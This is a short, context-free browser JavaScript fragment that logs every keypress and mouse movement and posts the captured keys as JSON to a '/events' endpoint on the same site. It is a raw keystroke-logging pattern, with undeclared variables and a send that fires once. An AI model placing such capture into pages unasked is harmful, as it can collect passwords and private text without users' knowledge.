document.addEventListener('keydown', function(e) { queue.push({text:e.key}); });
document.addEventListener('mousemove', function(e) { count++; });
fetch('/events', {method:'POST', body:JSON.stringify(queue)});
